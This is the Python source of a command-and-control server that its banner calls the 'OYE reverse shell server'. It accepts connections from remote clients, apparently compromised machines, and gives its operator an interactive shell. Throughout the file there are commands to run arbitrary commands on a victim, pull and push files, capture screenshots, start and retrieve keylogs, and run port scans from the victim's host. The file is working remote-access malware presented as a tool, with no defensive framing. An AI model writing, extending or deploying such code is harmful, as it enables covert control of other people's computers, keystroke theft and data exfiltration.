import socket
import threading
from queue import Queue
import time
import general
from PIL import Image
import os


VERSION = '2.1.2'
AUTHOR = 'admin87'
THREADS = 2
HOST = ''
PORT = 4761
MAX_FILE_SIZE = 20000000
JOB_NUM = [1, 2]

s = None
q = Queue()
all_conns = []
all_addrs = []


def main():
    print_intro()
    create_workers()
    create_jobs()


def create_socket():
    try:
        global HOST
        global PORT
        global s
        print("Creating socket...")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("[!] Failed to create socket")
        print("[-]", str(msg))


def bind_socket():
    try:
        global HOST
        global PORT
        global s
        print("Binding to port", str(PORT) + "...")
        s.bind((HOST, PORT))
        print("Listening...")
        s.listen(5)
    except socket.error as msg:
        print("[!] Failed to bind to port", PORT)
        print("[-]", msg)
        print("Retrying...")
        bind_socket()


def accept_conns():
    print("Closing all already existing connections...")
    for c in all_conns:
        c.close()
    print("Clearing connection and address lists...")
    del all_conns[:]
    del all_addrs[:]
    print("Accepting connections...")
    while True:
        try:
            conn, addr = s.accept()
            conn.setblocking(1)
            all_conns.append(conn)
            all_addrs.append(addr)
            print("\n\n[+] Successfully accepted " + addr[0] + "\n\nOYE> ", end='')
        except:
            print("\n[-] Failed to accept connection\n")


def start_shell():
    time.sleep(1)
    print()
    while True:
        cmd = input("OYE> ")
        if cmd == 'list':
            list_conns()
        elif 'select' in cmd:
            try:
                conn, target = get_target(cmd)
                send_cmd(conn)
            except:
                print("[-] Failed to connect\n")
                continue
        else:
            print("\n[-] Invalid command")
            print("[!] Available commands: list, select <client index>\n")


def list_conns():
    results = ''
    for i, conn in enumerate(all_conns):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
        except:
            del all_conns[i]
            del all_addrs[i]
            continue
        results += '[' + str(i) + ']    ' + str(all_addrs[i][0]) + ':' + str(all_addrs[i][1]) + '\n'
    print("\n--------- Available Clients ---------\n")
    print(results)


def get_target(cmd):
    try:
        target = int(cmd.replace('select ', ''))
        conn = all_conns[target]
        print("\n[+] Successfully connected to", str(all_addrs[target][0]) + '\n')
        return conn, target
    except:
        print("\n[!] Not a valid selection\n")
        return None


def send_cmd(conn):
    cwd = conn.recv(1024).decode("utf-8")
    print('\n' + cwd, end='')
    while True:
        try:
            cmd = input('> ')
            if len(cmd) > 0:
                if cmd == 'quit':
                    print()
                    break
                elif cmd.startswith('filedl'):
                    download_file(conn, cmd)
                elif cmd.startswith('fileup'):
                    upload_file(conn, cmd)
                elif cmd == 'screenshot':
                    screenshot(conn, cmd)
                elif cmd.startswith('keylog'):
                    keylog(conn, cmd)
                elif cmd.startswith('cd'):
                    conn.send(str.encode(cmd))
                    print('\n' + conn.recv(1024).decode("utf-8"), end='')
                elif cmd.startswith('portscan'):
                    port_scan(conn, cmd)
                else:
                    conn.send(str.encode(cmd))
                    response = conn.recv(20480)
                    text = response.decode("utf-8")
                    print(text, end="")
                    print('\n' + conn.recv(1024).decode("utf-8"), end='')
        except:
            print("\n\n[-] Connection with client was lost\n")
            break


def create_workers():
    for _ in range(THREADS):
        t = threading.Thread(target=work)
        t.daemon = True
        t.start()


def work():
    while True:
        i = q.get()
        if i == 1:
            create_socket()
            bind_socket()
            accept_conns()
        if i == 2:
            start_shell()
        q.task_done()


def create_jobs():
    for i in JOB_NUM:
        q.put(i)
    q.join()


def print_intro():
    desc = "| OYE reverse shell server by " + AUTHOR + " version " + VERSION + ' |'
    pad = '-' * len(desc)
    print()
    print(pad)
    print(desc)
    print(pad)


def download_file(conn, cmd):
    try:
        general.create_project_dir('OYE Downloads')
        conn.send(str.encode(cmd))
        file_path = cmd[7:]
        path_list = file_path.split('\\')
        file_name = str(path_list[-1])
        print("\nDownloading " + file_name + "...")
        f = open(os.getcwd() + '\\OYE Downloads\\' + file_name, 'wb')
        f.write(conn.recv(MAX_FILE_SIZE))
        f.close()
        print('\n[+] Download complete! File saved in ...\\OYE Downloads\\\n')
    except:
        print('\n[-] Server failed to download file!\n')


def upload_file(conn, cmd):
    try:
        src_file = cmd.split('|')[1]
        dest_dir = cmd.split('|')[2]
        file_name = src_file.split("\\")[-1]
        print("\nUploading " + file_name + " to " + dest_dir + "...")
        f = open(src_file, 'rb')
        conn.send(str.encode(cmd))
        conn.send(f.read(MAX_FILE_SIZE))
        print("\n[+] Upload complete!\n")
        f.close()
    except:
        print('\n[-] Server failed to upload file!\n')


def screenshot(conn, cmd):
    try:
        general.create_project_dir('OYE Downloads')
        img_name = 'screenshot_' + time.strftime('%Y_%m_%d_%H_%M_%S') + '.png'
        conn.send(str.encode(cmd))
        f = open(os.getcwd() + '\\OYE Downloads\\' + img_name, 'wb')
        f.write(conn.recv(1000000))
        f.close()
        img = Image.open(os.getcwd() + '\\OYE Downloads\\' + img_name)
        img.show()
        img.close()
        print('\n[+] Screenshot saved at ...\\OYE Downloads\\\n')
    except:
        print('\n[-] Server failed to screenshot!\n')


def keylog(conn, cmd):
    if cmd == 'keylog get':
        get_log(conn, cmd)
    elif cmd.startswith('keylog timed'):
        conn.send(cmd.encode())
        print('\n' + conn.recv(1024).decode("utf-8"), end='')
    elif cmd.startswith('keylog start'):
        conn.send(cmd.encode())
        print('\n' + conn.recv(1024).decode("utf-8"), end='')
    elif cmd.startswith('keylog stop'):
        conn.send(cmd.encode())
        print('\n' + conn.recv(1024).decode("utf-8"), end='')


def get_log(conn, cmd):
    try:
        conn.send(cmd.encode())
        general.create_project_dir('OYE Downloads')
        print("\nDownloading log...")
        f = open(os.getcwd() + '\\OYE Downloads\\oye_log.txt', 'wb')
        conn.settimeout(5.0)
        f.write(conn.recv(MAX_FILE_SIZE))
        print("\n[+] Download complete! Log saved in ...\\OYE Downloads\\\n")
        f.close()
    except socket.timeout:
        print('\n[-] Client timed out!')
        print('\n[!] The log may have been empty\n')
    except:
        print('\n[-] Server failed to download file!\n')


def port_scan(conn, cmd):
    if cmd == 'portscan get':
        get_port_scan(conn, cmd)
    else:
        conn.send(cmd.encode())
        print('\n' + conn.recv(1024).decode("utf-8"), end='')


def get_port_scan(conn, cmd):
    try:
        conn.send(cmd.encode())
        general.create_project_dir('OYE Downloads')
        print("\nDownloading port scan...")
        f = open(os.getcwd() + '\\OYE Downloads\\oye_port.txt', 'wb')
        conn.settimeout(5.0)
        f.write(conn.recv(MAX_FILE_SIZE))
        print("\n[+] Download complete! Port scan saved in ...\\OYE Downloads\\\n")
        f.close()
    except socket.timeout:
        print('\n[-] Client timed out!')
        print('\n[!] There may have been no open ports\n')
    except:
        print('\n[-] Server failed to download file!\n')

main()
